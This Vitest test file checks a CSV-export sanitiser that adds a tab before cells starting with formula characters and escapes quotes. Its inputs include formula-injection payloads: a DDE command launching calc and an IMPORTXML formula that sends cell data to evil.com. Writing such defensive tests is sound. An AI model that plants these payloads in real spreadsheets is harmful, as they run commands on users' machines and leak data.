import { describe, it, expect } from 'vitest'
import { sanitizeCsvCell } from '@/app/api/export/route'

describe('sanitizeCsvCell', () => {
  it('returns empty string for null', () => {
    expect(sanitizeCsvCell(null)).toBe('')
  })

  it('returns empty string for undefined', () => {
    expect(sanitizeCsvCell(undefined)).toBe('')
  })

  it('passes normal strings unchanged', () => {
    expect(sanitizeCsvCell('João Silva')).toBe('João Silva')
    expect(sanitizeCsvCell('Acme Corp')).toBe('Acme Corp')
  })

  it('prefixes formula-starting = with tab', () => {
    const result = sanitizeCsvCell('=HYPERLINK("http://evil.com")')
    expect(result).toMatch(/^\t/)
  })

  it('prefixes + with tab', () => {
    const result = sanitizeCsvCell('+cmd|"/C calc"!A0')
    expect(result).toMatch(/^\t/)
  })

  it('prefixes - with tab', () => {
    const result = sanitizeCsvCell('-2+3+cmd|"/C calc"!A0')
    expect(result).toMatch(/^\t/)
  })

  it('prefixes @ with tab', () => {
    const result = sanitizeCsvCell('@SUM(1+1)*cmd')
    expect(result).toMatch(/^\t/)
  })

  it('escapes double quotes per RFC 4180', () => {
    const result = sanitizeCsvCell('He said "hello"')
    expect(result).toBe('He said ""hello""')
  })

  it('does not prefix normal text starting with letters', () => {
    expect(sanitizeCsvCell('Nome da empresa')).not.toMatch(/^\t/)
  })

  it('preserves the rest of the string after tab prefix', () => {
    const dangerous = '=IMPORTXML(CONCAT("http://evil.com/",A1),"")'
    const result = sanitizeCsvCell(dangerous)
    expect(result).toBe(`\t${dangerous}`)
  })
})
